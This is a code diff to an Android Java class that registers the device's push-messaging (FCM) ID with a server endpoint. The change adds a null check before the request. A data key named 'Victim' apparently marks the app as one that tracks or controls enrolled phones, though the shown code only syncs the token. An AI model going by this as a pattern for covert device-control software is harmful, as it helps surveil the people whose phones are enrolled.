@@ -36,40 +36,44 @@ public class FCMSynchronizer extends BaseJSONPostNetworkAsyncTask<Void> {
     @Override
     protected Void doInBackground(String... strings) {
 
-        new APIRequestGateway(getContext(), new APIRequestGateway.APIRequestGatewayCallback() {
-            @Override
-            public void onReadyToRequest(String apiKey) {
+        if (newFcmId != null) {
+            new APIRequestGateway(getContext(), new APIRequestGateway.APIRequestGatewayCallback() {
+                @Override
+                public void onReadyToRequest(String apiKey) {
 
-                final Request fcmUpdateRequest = new APIRequestBuilder("/update/fcm", apiKey)
-                        .addParam(Victim.KEY_THE_FCM_ID, newFcmId)
-                        .build();
+                    final Request fcmUpdateRequest = new APIRequestBuilder("/update/fcm", apiKey)
+                            .addParam(Victim.KEY_THE_FCM_ID, newFcmId)
+                            .build();
 
-                OkHttpUtils.getInstance().getClient().newCall(fcmUpdateRequest).enqueue(new Callback() {
-                    @Override
-                    public void onFailure(Call call, IOException e) {
-                        e.printStackTrace();
-                    }
-
-                    @Override
-                    public void onResponse(Call call, Response response) throws IOException {
-                        try {
-                            new APIResponse(OkHttpUtils.logAndGetStringBody(response));
-                            PrefUtils.getInstance(getContext()).getEditor()
-                                    .putBoolean(PrefUtils.KEY_IS_FCM_SYNCED, true)
-                                    .commit();
-                        } catch (JSONException | APIResponse.APIException e) {
+                    OkHttpUtils.getInstance().getClient().newCall(fcmUpdateRequest).enqueue(new Callback() {
+                        @Override
+                        public void onFailure(Call call, IOException e) {
                             e.printStackTrace();
                         }
-                    }
-                });
 
-            }
+                        @Override
+                        public void onResponse(Call call, Response response) throws IOException {
+                            try {
+                                new APIResponse(OkHttpUtils.logAndGetStringBody(response));
+                                PrefUtils.getInstance(getContext()).getEditor()
+                                        .putBoolean(PrefUtils.KEY_IS_FCM_SYNCED, true)
+                                        .commit();
+                            } catch (JSONException | APIResponse.APIException e) {
+                                e.printStackTrace();
+                            }
+                        }
+                    });
 
-            @Override
-            public void onFailed(String reason) {
-                Log.e(X, "Failed to update fcm : " + reason);
-            }
-        });
+                }
+
+                @Override
+                public void onFailed(String reason) {
+                    Log.e(X, "Failed to update fcm : " + reason);
+                }
+            });
+        } else {
+            Log.e(X, "FCM ID is null , so not syncing...");
+        }
 
         return null;
     }
